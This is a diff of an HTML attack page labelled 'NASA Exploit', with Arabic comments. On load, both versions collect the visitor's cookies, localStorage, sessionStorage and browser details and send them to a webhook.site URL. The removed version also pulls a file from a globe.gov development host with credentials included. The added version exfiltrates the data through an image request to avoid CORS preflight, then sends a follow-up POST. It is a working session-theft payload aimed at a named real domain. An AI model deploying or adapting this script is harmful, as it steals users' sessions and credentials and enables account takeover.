@@ -1,62 +1,49 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>NASA Exploit</title>
-    <script>
-      (async () => {
-        const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
+<head>
+  <meta charset="UTF-8">
+  <title>NASA Attack</title>
+  <script>
+    (async () => {
+      const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
+      
+      // 🧠 تجميع معلومات الضحية
+      const victimInfo = {
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        url: location.href,
+        referrer: document.referrer,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        timestamp: new Date().toISOString()
+      };
 
-        // جمع معلومات الضحية
-        const victimData = {
-          documentCookie: document.cookie,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          platform: navigator.platform,
-          url: location.href,
-          localStorage: JSON.stringify(localStorage),
-          sessionStorage: JSON.stringify(sessionStorage)
-        };
+      // 🔥 المحاولة 1: إرسال كـ صورة (img.src) لتفادي preflight
+      const queryParams = encodeURIComponent(JSON.stringify(victimInfo));
+      const img = new Image();
+      img.src = webhook + "?data=" + queryParams;
 
-        // محاولة الوصول إلى ملفات من NASA (globe.gov) مع credentials
+      // 🕒 ننتظر قليلًا ثم نحاول fetch (للضمان)
+      setTimeout(async () => {
         try {
-          const r = await fetch("https://dataentrydev.globe.gov/app/js/observer/observerService.js", {
-            method: "GET",
-            credentials: "include"
-          });
-
-          const scriptData = await r.text();
-
-          // إرسال البيانات مع المحتوى المأخوذ من نطاق NASA
           await fetch(webhook, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              tag: "NASA-Exploit",
-              victimData,
-              nasaFileSnippet: scriptData.substring(0, 1500),
-              status: "✅ Script fetched with credentials",
-              timestamp: new Date().toISOString()
+              type: "full-fetch",
+              victimInfo
             })
           });
-        } catch (err) {
-          // إذا فشل fetch
-          await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              tag: "NASA-Exploit",
-              victimData,
-              status: "❌ Failed to fetch NASA file",
-              error: err.toString(),
-              timestamp: new Date().toISOString()
-            })
-          });
+        } catch (e) {
+          // حتى لو فشل، نحاول مجددًا لاحقًا
         }
-      })();
-    </script>
-  </head>
-  <body>
-    <h1 style="display: none">Loading...</h1>
-  </body>
+      }, 3000);
+    })();
+  </script>
+</head>
+<body>
+  <h1 style="display: none;">Loading...</h1>
+</body>
 </html>
